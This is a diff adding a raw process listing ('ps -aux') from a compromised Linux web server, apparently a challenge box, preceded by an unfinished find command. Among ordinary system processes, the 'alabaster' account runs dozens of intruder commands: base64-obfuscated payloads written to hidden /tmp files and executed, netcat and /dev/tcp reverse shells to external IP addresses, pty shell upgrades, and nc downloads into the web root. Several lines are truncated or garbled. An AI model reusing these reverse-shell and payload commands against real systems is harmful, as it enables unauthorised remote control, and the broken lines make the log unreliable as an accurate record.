@@ -1,0 +1,458 @@
+find / -type d \( -path /bin -o -path /boot -o  -path /dev -o -path /etc -o -path /home -o -path /lib -o -path /media -o -path /mnt -o -path /opt -o -path /sbin -o -path /srv -o -path /tmp -o -path /usr -o -path /var -o -path /root -o -path /proc -o
+ \) -prune -o -print
+
+
+$ ps -aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.0 204356  6720 ?        Ss   Dec17   0:01 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    Dec17   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        S    Dec17   0:02 [ksoftirqd/0]
+root         5  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/0:0H]
+root         7  0.1  0.0      0     0 ?        S    Dec17   0:21 [rcu_sched]
+root         8  0.0  0.0      0     0 ?        S    Dec17   0:00 [rcu_bh]
+root         9  0.0  0.0      0     0 ?        S    Dec17   0:02 [migration/0]
+root        10  0.0  0.0      0     0 ?        S<   Dec17   0:00 [lru-add-drain]
+root        11  0.0  0.0      0     0 ?        S    Dec17   0:00 [watchdog/0]
+root        12  0.0  0.0      0     0 ?        S    Dec17   0:00 [cpuhp/0]
+root        13  0.0  0.0      0     0 ?        S    Dec17   0:00 [cpuhp/1]
+root        14  0.0  0.0      0     0 ?        S    Dec17   0:00 [watchdog/1]
+root        15  0.0  0.0      0     0 ?        S    Dec17   0:02 [migration/1]
+root        16  0.0  0.0      0     0 ?        S    Dec17   0:02 [ksoftirqd/1]
+root        18  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/1:0H]
+root        19  0.0  0.0      0     0 ?        S    Dec17   0:00 [cpuhp/2]
+root        20  0.0  0.0      0     0 ?        S    Dec17   0:00 [watchdog/2]
+root        21  0.0  0.0      0     0 ?        S    Dec17   0:02 [migration/2]
+root        22  0.0  0.0      0     0 ?        S    Dec17   0:02 [ksoftirqd/2]
+root        24  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/2:0H]
+root        25  0.0  0.0      0     0 ?        S    Dec17   0:00 [cpuhp/3]
+root        26  0.0  0.0      0     0 ?        S    Dec17   0:00 [watchdog/3]
+root        27  0.0  0.0      0     0 ?        S    Dec17   0:02 [migration/3]
+root        28  0.0  0.0      0     0 ?        S    Dec17   0:02 [ksoftirqd/3]
+root        30  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/3:0H]
+root        31  0.0  0.0      0     0 ?        S    Dec17   0:00 [cpuhp/4]
+root        32  0.0  0.0      0     0 ?        S    Dec17   0:00 [watchdog/4]
+root        33  0.0  0.0      0     0 ?        S    Dec17   0:01 [migration/4]
+root        34  0.0  0.0      0     0 ?        S    Dec17   0:03 [ksoftirqd/4]
+root        36  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/4:0H]
+root        37  0.0  0.0      0     0 ?        S    Dec17   0:00 [cpuhp/5]
+root        38  0.0  0.0      0     0 ?        S    Dec17   0:00 [watchdog/5]
+root        39  0.0  0.0      0     0 ?        S    Dec17   0:02 [migration/5]
+root        40  0.0  0.0      0     0 ?        S    Dec17   0:01 [ksoftirqd/5]
+root        42  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/5:0H]
+3  0.0  0.0      0     0 ?        S    Dec17   0:00 [cpuhp/6]
+root        44  0.0  0.0      0     0 ?        S    Dec17   0:00 [watchdog/6]
+root        45  0.0  0.0      0     0 ?        S    Dec17   0:02 [migration/6]
+root        46  0.0  0.0      0     0 ?        S    Dec17   0:02 [ksoftirqd/6]
+root        48  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/6:0H]
+root        49  0.0  0.0      0     0 ?        S    Dec17   0:00 [cpuhp/7]
+root        50  0.0  0.0      0     0 ?        S    Dec17   0:00 [watchdog/7]
+root        51  0.0  0.0      0     0 ?        S    Dec17   0:02 [migration/7]
+root        52  0.0  0.0      0     0 ?        S    Dec17   0:02 [ksoftirqd/7]
+root        53  0.0  0.0      0     0 ?        S    Dec17   0:00 [kworker/7:0]
+root        54  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/7:0H]
+root        55  0.0  0.0      0     0 ?        S    Dec17   0:00 [kdevtmpfs]
+root        56  0.0  0.0      0     0 ?        S<   Dec17   0:00 [netns]
+root        57  0.0  0.0      0     0 ?        S    Dec17   0:00 [khungtaskd]
+root        58  0.0  0.0      0     0 ?        S    Dec17   0:00 [oom_reaper]
+root        59  0.0  0.0      0     0 ?        S<   Dec17   0:00 [writeback]
+root        60  0.0  0.0      0     0 ?        S    Dec17   0:00 [kcompactd0]
+root        62  0.0  0.0      0     0 ?        SN   Dec17   0:00 [ksmd]
+root        63  0.0  0.0      0     0 ?        SN   Dec17   0:00 [khugepaged]
+root        64  0.0  0.0      0     0 ?        S<   Dec17   0:00 [crypto]
+root        65  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kintegrityd]
+root        66  0.0  0.0      0     0 ?        S<   Dec17   0:00 [bioset]
+root        67  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kblockd]
+root        68  0.0  0.0      0     0 ?        S<   Dec17   0:00 [devfreq_wq]
+root        69  0.0  0.0      0     0 ?        S<   Dec17   0:00 [watchdogd]
+root        74  0.0  0.0      0     0 ?        S    Dec17   0:00 [kswapd0]
+root        75  0.0  0.0      0     0 ?        S<   Dec17   0:00 [vmstat]
+root        87  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kthrotld]
+root        88  0.0  0.0      0     0 ?        S<   Dec17   0:00 [ipv6_addrconf]
+root       100  0.0  0.0      0     0 ?        S    Dec17   0:00 [kworker/2:1]
+root       145  0.0  0.0      0     0 ?        S    Dec17   0:00 [kworker/6:1]
+root       166  0.0  0.0      0     0 ?        S    Dec17   0:00 [scsi_eh_0]
+root       167  0.0  0.0      0     0 ?        S<   Dec17   0:00 [scsi_tmf_0]
+root       169  0.0  0.0      0     0 ?        S<   Dec17   0:00 [bioset]
+root       449  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/0:1H]
+root       451  0.0  0.0      0     0 ?        S    Dec17   0:00 [jbd2/sda1-8]
+root       452  0.0  0.0      0     0 ?        S<   Dec17   0:00 [ext4-rsv-conver]
+root       474  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/4:1H]
+root       482  0.0  0.0  54284 17260 ?        Ss   Dec17   0:04 /lib/systemd/systemd-journald
+root       485  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/2:1H]
+root       489  0.0  0.0      0     0 ?        S    Dec17   0:00 [kauditd]
+root       493  0.0  0.0      0     0 ?        S    Dec17   0:00 [kworker/2:2]
+root       506  0.0  0.0  45932  4096 ?        Ss   Dec17   0:00 /lib/systemd/systemd-udevd
+root       563  0.0  0.0      0     0 ?        S<   Dec17   0:00 [edac-poller]
+root       567  0.0  0.0 250116  2868 ?        Ssl  Dec17   0:01 /usr/sbin/rsyslogd -n
+root       568  0.0  0.0   4216  1144 ?        Ss   Dec17   0:00 /usr/sbin/acpid
+root       570  0.0  0.0  37980  2136 ?        Ss   Dec17   0:00 /lib/systemd/systemd-logind
+message+   574  0.0  0.0  45256  4008 ?        Ss   Dec17   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+root       597  0.0  0.0  35940  1944 ?        Ss   Dec17   0:00 /usr/sbin/irqbalance --foreground
+root       598  0.0  0.0  29664  2860 ?        Ss   Dec17   0:00 /usr/sbin/cron -f
+root       635  0.0  0.0      0     0 ?        S    Dec17   0:00 [kworker/3:2]
+root       715  0.0  0.0  20468  1924 ?        Ss   Dec17   0:00 /sbin/dhclient -4 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
+root       734  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/1:1H]
+root       735  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/5:1H]
+root       736  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/3:1H]
+root       737  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/6:1H]
+root       738  0.0  0.0      0     0 ?        S<   Dec17   0:00 [kworker/7:1H]
+root       763  0.0  0.0 222692 26192 ?        Ss   Dec17   0:00 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
+root       765  0.0  0.0      0     0 ?        S    Dec17   0:00 [kworker/6:2]
+alabast+   793  5.0  1.2 936464 390576 ?       Sl   Dec17  13:44 /opt/jre/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dfile.encoding=UTF-8 -Dnet.sf.ehcache.skipUpdateCheck=true -XX:+UseConcMarkSweepGC -XX:+CMSClassUnloadingEnabled -XX:+UseParNewGC -XX:MaxPermSize=128m -Xms512m -Xmx512m -Djava.endorsed.dirs=/opt/apache-tomcat/endorsed -classpath /opt/apache-tomcat/bin/bootstrap.jar -Dcatalina.base=/opt/apache-tomcat -Dcatalina.home=/opt/apache-tomcat -Djava.io.tmpdir=/opt/apache-tomcat/temp org.apache.catalina.startup.Bootstrap start
+ntp        795  0.0  0.0  97852  3820 ?        Ssl  Dec17   0:00 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -c /run/ntp.conf.dhcp -u 106:110
+www-data   809  0.0  0.0 222888 10104 ?        S    Dec17   0:00 php-fpm: pool www
+www-data   810  0.0  0.0 222888 10040 ?        S    Dec17   0:00 php-fpm: pool www
+root       817  0.0  0.0  14536  1640 tty1     Ss+  Dec17   0:00 /sbin/agetty --noclear tty1 linux
+root       818  0.0  0.0  14312  1988 ttyS0    Ss+  Dec17   0:00 /sbin/agetty --keep-baud 115200,38400,9600 ttyS0 vt220
+root       819  0.0  0.0 159500  1716 ?        Ss   Dec17   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
+www-data   820  0.3  0.0 160320  5188 ?        S    Dec17   0:52 nginx: worker process
+www-data   821  0.3  0.0 160188  5180 ?        S    Dec17   0:53 nginx: worker process
+www-data   822  0.3  0.0 160320  5184 ?        S    Dec17   0:52 nginx: worker process
+www-data   823  0.2  0.0 160452  5452 ?        S    Dec17   0:48 nginx: worker process
+www-data   824  0.3  0.0 160324  5180 ?        S    Dec17   0:50 nginx: worker process
+www-data   825  0.3  0.0 160324  5188 ?        S    Dec17   0:52 nginx: worker process
+www-data   826  0.2  0.0 160584  5456 ?        S    Dec17   0:48 nginx: worker process
+www-data   827  0.2  0.0 160452  5456 ?        S    Dec17   0:47 nginx: worker process
+root       839  0.0  0.0      0     0 ?        S    Dec17   0:00 [kworker/4:2]
+root       856  0.0  0.0  69944  6236 ?        Ss   Dec17   0:04 /usr/sbin/sshd -D
+root       886  0.0  0.0  54360 19860 ?        Ss   Dec17   0:00 /usr/bin/python /usr/bin/google_ip_forwarding_daemon
+root       888  0.0  0.0  54368 19736 ?        Ss   Dec17   0:00 /usr/bin/python /usr/bin/google_clock_skew_daemon
+root       890  0.0  0.0  54796 19836 ?        Ss   Dec17   0:01 /usr/bin/python /usr/bin/google_accounts_daemon
+alabast+  1483  0.0  0.0   4288   796 ?        S    Dec17   0:00 sh
+alabast+  1574  0.0  0.0  11168  2896 ?        S    Dec17   0:00 bash
+alabast+  1589  0.0  0.0  33836  7348 ?        S    Dec17   0:00 python -c import pty;pty.spawn("/bin/bash")
+alabast+  1590  0.0  0.0  20964  4940 pts/0    Ss   Dec17   0:00 /bin/bash
+alabast+  1672  0.0  0.0  11172  2856 ?        S    Dec17   0:00 /bin/bash -c echo cHl0aG9uIC90bXAvZmRzYQ== | base64 -d | tee -a /tmp/.A5c0kAhRwh9c08bxnHC6.tmp ; /bin/bash /tmp/.A5c0kAhRwh9c08bxnHC6.tmp ; /bin/rm /tmp/.A5c0kAhRwh9c08bxnHC6.tmp
+alabast+  1676  0.0  0.0  11172  2972 ?        S    Dec17   0:00 /bin/bash /tmp/.A5c0kAhRwh9c08bxnHC6.tmp
+alabast+  1677  0.0  0.0  43820 10160 ?        S    Dec17   0:00 python /tmp/fdsa
+alabast+  1678  0.0  0.0  20960  4772 pts/1    Ss+  Dec17   0:00 /bin/bash
+www-data  1972  0.0  0.0   4288   720 ?        S    Dec17   0:00 sh -c grep alabaster /* -R
+www-data  1973  0.0  0.0  11168  1920 ?        S    Dec17   0:00 grep alabaster /bin /boot /dev /etc /home /initrd.img /initrd.img.old /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz /vmlinuz.old -R
+www-data  1987  0.0  0.0   4288   728 ?        S    Dec17   0:00 sh -c grep alabaster /* -R
+www-data  1988  0.0  0.0  11168  2060 ?        S    Dec17   0:00 grep alabaster /bin /boot /dev /etc /home /initrd.img /initrd.img.old /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz /vmlinuz.old -R
+www-data  1997  0.0  0.0 222952 11596 ?        S    Dec17   0:00 php-fpm: pool www
+www-data  2063  0.0  0.0 222888 10296 ?        S    Dec17   0:09 php-fpm: pool www
+alabast+  2311  0.0  0.0  11176  2920 ?        S    Dec17   0:00 /bin/bash -c echo bWtmaWZvIC90bXAvc2RmYm9lbTsgbmMgMTczLjI0LjEzOS4yMiA5OTk5IDA8L3RtcC9zZGZib2VtIHwgL2Jpbi9zaCA+L3RtcC9zZGZib2VtIDI+JjE7IHJtIC90bXAvc2RmYm9lbSA= | base64 -d | tee -a /tmp/.18ZX782M3uokFCMJ7h9c.tmp ; /bin/bash /tmp/.18ZX782M3uokFCMJ7h9c.tmp ; /bin/rm /tmp/.18ZX782M3uokFCMJ7h9c.tmp
+alabast+  2315  0.0  0.0  11176  2920 ?        S    Dec17   0:00 /bin/bash /tmp/.18ZX782M3uokFCMJ7h9c.tmp
+alabast+  2318  0.0  0.0   4288  1588 ?        S    Dec17   0:00 /bin/sh
+root      3899  0.0  0.0      0     0 ?        S    Dec17   0:00 [kworker/1:0]
+alabast+  4131  0.0  0.0   4288   796 ?        S    Dec17   0:00 sh
+alabast+  4180  0.0  0.0   2976  1812 ?        Sl   Dec17   0:13 ./cleanup
+www-data  4370  0.0  0.0 222952 11668 ?        S    Dec17   0:00 php-fpm: pool www
+alabast+  5138  0.0  0.0  12884  2540 pts/0    S+   Dec17   0:01 grep -iR alabaster bin boot dev etc home initrd.img initrd.img.old lib lib32 lib64 libx32 lost+found media mnt opt proc root run sbin srv sys tmp usr var vmlinuz vmlinuz.old
+alabast+  5579  0.0  0.0   4288   712 ?        S    Dec17   0:00 /bin/sh -c mkfifo /tmp/wqygb; nc 40.69.173.67 54599 0</tmp/wqygb | /bin/sh >/tmp/wqygb 2>&1; rm /tmp/wqygb 
+alabast+  5581  0.0  0.0   6312  1604 ?        S    Dec17   0:00 nc 40.69.173.67 54599
+alabast+  5582  0.0  0.0   4288   764 ?        S    Dec17   0:00 /bin/sh
+root      5692  0.0  0.0      0     0 ?        S    Dec17   0:00 [kworker/0:0]
+alabast+  5735  0.0  0.0  11172  2880 ?        S    Dec17   0:00 /bin/bash -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOC4yMTcuMjIzLjU0LzgwODAgMD4mMQ== | base64 -d | tee -a /tmp/.o5rqzHJD5Bd5cVZ6tZHA.tmp ; /bin/bash /tmp/.o5rqzHJD5Bd5cVZ6tZHA.tmp ; /bin/rm /tmp/.o5rqzHJD5Bd5cVZ6tZHA.tmp
+alabast+  5739  0.0  0.0  11172  2948 ?        S    Dec17   0:00 /bin/bash /tmp/.o5rqzHJD5Bd5cVZ6tZHA.tmp
+alabast+  5740  0.0  0.0  20960  4736 ?        S    Dec17   0:00 bash -i
+alabast+  5989  0.0  0.0   6596  6192 ?        Sl   Dec17   0:02 ./hax2
+alabast+  6055  0.0  0.0  11168  3000 ?        S    Dec17   0:00 bash
+alabast+  6082  0.0  0.0  11172  3056 ?        S    Dec17   0:00 /bin/bash -c echo bmMgLWUgL2Jpbi9iYXNoIDE2NS4yMjcuMTc3Ljk4IDEzMzc= | base64 -d | tee -a /tmp/.I498r8wtG4e4jDb08a28.tmp ; /bin/bash /tmp/.I498r8wtG4e4jDb08a28.tmp ; /bin/rm /tmp/.I498r8wtG4e4jDb08a28.tmp
+alabast+  6087  0.0  0.0  11172  2944 ?        S    Dec17   0:00 /bin/bash /tmp/.I498r8wtG4e4jDb08a28.tmp
+alabast+  6088  0.0  0.0  11168  3064 ?        S    Dec17   0:00 bash
+alabast+  6089  0.0  0.0  11172  2956 ?        S    Dec17   0:00 /bin/bash -c echo cGluZyAzOC4xODUuNDguMzg= | base64 -d | tee -a /tmp/.eTjK8Rv80Bc04w39D2j3.tmp ; /bin/bash /tmp/.eTjK8Rv80Bc04w39D2j3.tmp ; /bin/rm /tmp/.eTjK8Rv80Bc04w39D2j3.tmp
+alabast+  6094  0.0  0.0  11172  2944 ?        S    Dec17   0:00 /bin/bash /tmp/.eTjK8Rv80Bc04w39D2j3.tmp
+alabast+  6095  0.0  0.0  17840  1172 ?        S    Dec17   0:00 ping 38.185.48.38
+alabast+  6114  0.0  0.0  33836  7296 ?        S    Dec17   0:00 python -c import pty; pty.spawn("/bin/bash")
+alabast+  6115  0.0  0.0  20964  4872 pts/7    Ss   Dec17   0:00 /bin/bash
+alabast+  6215  0.0  0.0   4288   724 ?        S    Dec17   0:00 /bin/sh -c mkfifo /tmp/qodzas; nc 40.69.173.67 54599 0</tmp/qodzas | /bin/sh >/tmp/qodzas 2>&1; rm /tmp/qodzas 
+alabast+  6217  0.0  0.0   6312  1668 ?        S    Dec17   0:00 nc 40.69.173.67 54599
+alabast+  6218  0.0  0.0   4288  1500 ?        S    Dec17   0:00 /bin/sh
+alabast+  7830  0.0  0.0  11172  3000 ?        S    Dec17   0:00 /bin/bash -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOC4yMTcuMjIzLjU0LzgwODAgMD4mMQ== | base64 -d | tee -a /tmp/.c01d6SbSCyq496dIz291.tmp ; /bin/bash /tmp/.c01d6SbSCyq496dIz291.tmp ; /bin/rm /tmp/.c01d6SbSCyq496dIz291.tmp
+alabast+  7834  0.0  0.0  11172  3052 ?        S    Dec17   0:00 /bin/bash /tmp/.c01d6SbSCyq496dIz291.tmp
+alabast+  7835  0.0  0.0  20960  4736 ?        S    Dec17   0:00 bash -i
+alabast+  7871  0.0  0.0   2428  1056 ?        Sl   Dec17   0:02 ./hax2
+alabast+  7911  0.0  0.0   6312  1692 ?        S    Dec17   0:00 nc -w3 35.165.54.108 1337 > /var/www/html/test.jpg
+alabast+  8142  0.0  0.0   6312  1760 ?        S    Dec17   0:00 nc -w3 35.165.54.108 1337 > /var/www/html/imgs/test.jpg
+alabast+  8224  0.0  0.0  11176  2944 ?        S    Dec17   0:00 /bin/bash -c echo cm0gL3RtcC9rO21rZmlmbyAvdG1wL2s7Y2F0IC90bXAva3wvYmluL3NoIC1pIDI+JjF8bmMgLXcgMyA0NS42Mi4yMjkuMTE3IDMxMzM0ID4vdG1wL2Y= | base64 -d | tee -a /tmp/.cEtN7TG8Fp47MQ8B7X90.tmp ; /bin/bash /tmp/.cEtN7TG8Fp47MQ8B7X90.tmp ; /bin/rm /tmp/.cEtN7TG8Fp47MQ8B7X90.tmp
+alabast+  8228  0.0  0.0  11176  3024 ?        S    Dec17   0:00 /bin/bash /tmp/.cEtN7TG8Fp47MQ8B7X90.tmp
+alabast+  8231  0.0  0.0   5844   692 ?        S    Dec17   0:00 cat /tmp/k
+alabast+  8232  0.0  0.0   4288   772 ?        S    Dec17   0:00 /bin/sh -i
+alabast+  8290  0.0  0.0  11176  3004 ?        S    Dec17   0:00 /bin/bash -c echo cm0gL3RtcC9rO21rZmlmbyAvdG1wL2s7Y2F0IC90bXAva3wvYmluL3NoIC1pIDI+JjF8bmMgLXcgMyA0NS42Mi4yMjkuMTE3IDMxMzM0ID4vdG1wL2Y= | base64 -d | tee -a /tmp/.E5gOW0kW79n352KMtJ8P.tmp ; /bin/bash /tmp/.E5gOW0kW79n352KMtJ8P.tmp ; /bin/rm /tmp/.E5gOW0kW79n352KMtJ8P.tmp
+alabast+  8295  0.0  0.0  11176  3068 ?        S    Dec17   0:00 /bin/bash /tmp/.E5gOW0kW79n352KMtJ8P.tmp
+alabast+  8298  0.0  0.0   5844   680 ?        S    Dec17   0:00 cat /tmp/k
+alabast+  8299  0.0  0.0   4288   720 ?        S    Dec17   0:00 /bin/sh -i
+alabast+  8392  0.0  0.0  11176  2880 ?        S    Dec17   0:00 /bin/bash -c echo cm0gL3RtcC9rO21rZmlmbyAvdG1wL2s7Y2F0IC90bXAva3wvYmluL3NoIC1pIDI+JjF8bmMgLXcgMyA0NS42Mi4yMjkuMTE3IDMxMzM1ID4vdG1wL2s= | base64 -d | tee -a /tmp/.D1JjO3DwVUYzfycrVy08.tmp ; /bin/bash /tmp/.D1JjO3DwVUYzfycrVy08.tmp ; /bin/rm /tmp/.D1JjO3DwVUYzfycrVy08.tmp
+alabast+  8396  0.0  0.0  11176  2960 ?        S    Dec17   0:00 /bin/bash /tmp/.D1JjO3DwVUYzfycrVy08.tmp
+alabast+  8399  0.0  0.0   5980   768 ?        S    Dec17   0:00 cat /tmp/k
+alabast+  8400  0.0  0.0   4288   748 ?        S    Dec17   0:00 /bin/sh -i
+alabast+  8401  0.0  0.0   6312  1760 ?        S    Dec17   0:00 nc -w 3 45.62.229.117 31335
+alabast+  8417  0.0  0.0   4288  1284 ?        S    Dec17   0:00 sh
+alabast+  8491  0.0  0.0   5852   700 pts/7    S+   Dec17   0:00 md5sum
+alabast+  8665  0.0  0.0  11176  2944 ?        S    Dec17   0:00 /bin/bash -c echo cm0gL3RtcC9rO21rZmlmbyAvdG1wL2s7Y2F0IC90bXAva3wvYmluL3NoIC1pIDI+JjF8bmMgLXcgMyA0NS42Mi4yMjkuMTE3IDMxMzM0ID4vdG1wL2s= | base64 -d | tee -a /tmp/.Lmq8PPt4i89oLvV05mw6.tmp ; /bin/bash /tmp/.Lmq8PPt4i89oLvV05mw6.tmp ; /bin/rm /tmp/.Lmq8PPt4i89oLvV05mw6.tmp
+alabast+  8670  0.0  0.0  11176  2956 ?        S    Dec17   0:00 /bin/bash /tmp/.Lmq8PPt4i89oLvV05mw6.tmp
+alabast+  8673  0.0  0.0   5980   768 ?        S    Dec17   0:00 cat /tmp/k
+alabast+  8674  0.0  0.0   4288   764 ?        S    Dec17   0:00 /bin/sh -i
+alabast+  8675  0.0  0.0   6312  1688 ?        S    Dec17   0:00 nc -w 3 45.62.229.117 31334
+xyetB4Zwzp3M4a.tmp ; /bin/rm /tmp/.IMe7HLxyetB4Zwzp3M4a.tmp
+alabast+  8769  0.0  0.0  11172  2876 ?        S    Dec17   0:00 /bin/bash /tmp/.IMe7HLxyetB4Zwzp3M4a.tmp
+alabast+  8770  0.0  0.0  11192  3100 ?        S    Dec17   0:00 bash
+alabast+  9018  0.0  0.0  33836  7260 ?        S    Dec17   0:00 python -c import pty; pty.spawn("/bin/bash"); 
+alabast+  9019  0.0  0.0  20960  4988 pts/11   Ss+  Dec17   0:00 /bin/bash
+www-data  9153  0.0  0.0   4288   764 ?        S    Dec17   0:00 sh -c grep -R -i alabaster_snowbal /*
+www-data  9154  0.0  0.0  11168  2084 ?        S    Dec17   0:00 grep -R -i alabaster_snowbal /bin /boot /dev /etc /home /initrd.img /initrd.img.old /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz /vmlinuz.old
+root      9446  0.0  0.0      0     0 ?        S    Dec17   0:00 [kworker/5:0]
+alabast+  9725  0.0  0.0  11172  3008 ?        S    Dec17   0:00 /bin/bash -c echo bmMgLWUgL2Jpbi9iYXNoIDE2NS4yMjcuMTc3Ljk4IDEzMzc= | base64 -d | tee -a /tmp/.86q80R8J5g48A2t4PVMC.tmp ; /bin/bash /tmp/.86q80R8J5g48A2t4PVMC.tmp ; /bin/rm /tmp/.86q80R8J5g48A2t4PVMC.tmp
+alabast+  9730  0.0  0.0  11172  2944 ?        S    Dec17   0:00 /bin/bash /tmp/.86q80R8J5g48A2t4PVMC.tmp
+alabast+  9731  0.0  0.0  11188  2896 ?        S    Dec17   0:00 bash
+alabast+  9749  0.0  0.0  11172  2944 ?        S    Dec17   0:00 /bin/bash -c echo cGluZyA2NC4xMzcuMjUyLjI= | base64 -d | tee -a /tmp/.89S1729U50I05an670Ge.tmp ; /bin/bash /tmp/.89S1729U50I05an670Ge.tmp ; /bin/rm /tmp/.89S1729U50I05an670Ge.tmp
+alabast+  9754  0.0  0.0  11172  2944 ?        S    Dec17   0:00 /bin/bash /tmp/.89S1729U50I05an670Ge.tmp
+alabast+  9755  0.0  0.0  17840  1152 ?        S    Dec17   0:00 ping 64.137.252.2
+alabast+  9837  0.0  0.0  11172  2944 ?        S    Dec17   0:00 /bin/bash -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC82NC4xMzcuMjUyLjIvODQ0MyAwPiYx | base64 -d | tee -a /tmp/.4RVySxCh1U4NmiZuone7.tmp ; /bin/bash /tmp/.4RVySxCh1U4NmiZuone7.tmp ; /bin/rm /tmp/.4RVySxCh1U4NmiZuone7.tmp
+alabast+  9841  0.0  0.0  11172  2884 ?        S    Dec17   0:00 /bin/bash /tmp/.4RVySxCh1U4NmiZuone7.tmp
+alabast+  9842  0.0  0.0  20964  4984 ?        S    Dec17   0:00 bash -i
+alabast+  9947  0.0  0.0  11172  3000 ?        S    Dec17   0:00 /bin/bash -c echo L2Jpbi9iYXNoIC1jICIvYmluL3NoIDE+L2Rldi90Y3AvNzAuNTQuMTM1LjE0Ni84MCAwPiYxIDI+JjEi | base64 -d | tee -a /tmp/.yx8Mo68zpg5U87RD843H.tmp ; /bin/bash /tmp/.yx8Mo68zpg5U87RD843H.tmp ; /bin/rm /tmp/.yx8Mo68zpg5U87RD843H.tmp
+alabast+  9951  0.0  0.0  11172  2884 ?        S    Dec17   0:00 /bin/bash /tmp/.yx8Mo68zpg5U87RD843H.tmp
+alabast+  9952  0.0  0.0  11168  2944 ?        S    Dec17   0:00 /bin/bash -c /bin/sh 1>/dev/tcp/70.54.135.146/80 0>&1 2>&1
+alabast+  9953  0.0  0.0   4288  1580 ?        S    Dec17   0:00 /bin/sh
+alabast+  9976  0.0  0.0   1216   908 ?        Sl   Dec17   0:03 /tmp/LYVSe
+alabast+ 10053  0.0  0.0      0     0 ?        Z    Dec17   0:00 [hiDWh] <defunct>
+alabast+ 10619  0.0  0.0  11172  3048 ?        S    Dec17   0:00 /bin/bash -c echo bmMgLW52IDgxLjE1OS43My45MCA0NDMgLWUgL2Jpbi9zaA== | base64 -d | tee -a /tmp/.dkE9zl7xI31kkX703O1W.tmp ; /bin/bash /tmp/.dkE9zl7xI31kkX703O1W.tmp ; /bin/rm /tmp/.dkE9zl7xI31kkX703O1W.tmp
+alabast+ 10623  0.0  0.0  11172  3004 ?        S    Dec17   0:00 /bin/bash /tmp/.dkE9zl7xI31kkX703O1W.tmp
+alabast+ 10624  0.0  0.0   4288   728 ?        S    Dec17   0:00 sh
+alabast+ 10651  0.0  0.0  33836  7248 ?        S    Dec17   0:00 python -c import pty; pty.spawn("/bin/bash")
+alabast+ 10652  0.0  0.0  20964  4736 pts/2    Ss+  Dec17   0:00 /bin/bash
+alabast+ 11166  0.0  0.0  11172  2884 ?        S    Dec17   0:00 /bin/bash -c echo L2Jpbi9iYXNoIC1jICIvYmluL3NoIDE+L2Rldi90Y3AvNzAuNTQuMTM1LjE0Ni84MCAwPiYxIDI+JjEi | base64 -d | tee -a /tmp/.5356znSskG2VisTWMcKb.tmp ; /bin/bash /tmp/.5356znSskG2VisTWMcKb.tmp ; /bin/rm /tmp/.5356znSskG2VisTWMcKb.tmp
+alabast+ 11170  0.0  0.0  11172  2944 ?        S    Dec17   0:00 /bin/bash /tmp/.5356znSskG2VisTWMcKb.tmp
+alabast+ 11171  0.0  0.0  11168  2940 ?        S    Dec17   0:00 /bin/bash -c /bin/sh 1>/dev/tcp/70.54.135.146/80 0>&1 2>&1
+alabast+ 11172  0.0  0.0   4288  1660 ?        S    Dec17   0:00 /bin/sh
+alabast+ 11176  0.0  0.0  11172  2880 ?        S    Dec17   0:00 /bin/bash -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC82NC4xMzcuMjUyLjIvODQ0MyAwPiYx | base64 -d | tee -a /tmp/.IR7vLakWSK0306P9047U.tmp ; /bin/bash /tmp/.IR7vLakWSK0306P9047U.tmp ; /bin/rm /tmp/.IR7vLakWSK0306P9047U.tmp
+alabast+ 11180  0.0  0.0  11172  2944 ?        S    Dec17   0:00 /bin/bash /tmp/.IR7vLakWSK0306P9047U.tmp
+alabast+ 11181  0.0  0.0  21028  4972 ?        S    Dec17   0:00 bash -i
+alabast+ 11223  0.0  0.0  11172  2884 ?        S    Dec17   0:00 /bin/bash -c echo Z3JlcCAiYWxhYmFzdGVyIiAtUiAvID4gL3Zhci93d3cvaHRtbC9sc2dyZXAudHh0 | base64 -d | tee -a /tmp/.jB2q6V0iqw103Bc5Ofbd.tmp ; /bin/bash /tmp/.jB2q6V0iqw103Bc5Ofbd.tmp ; /bin/rm /tmp/.jB2q6V0iqw103Bc5Ofbd.tmp
+alabast+ 11228  0.0  0.0  11172  3052 ?        S    Dec17   0:00 /bin/bash /tmp/.jB2q6V0iqw103Bc5Ofbd.tmp
+alabast+ 11229  0.0  0.0  13332  2696 ?        S    Dec17   0:01 grep alabaster -R /
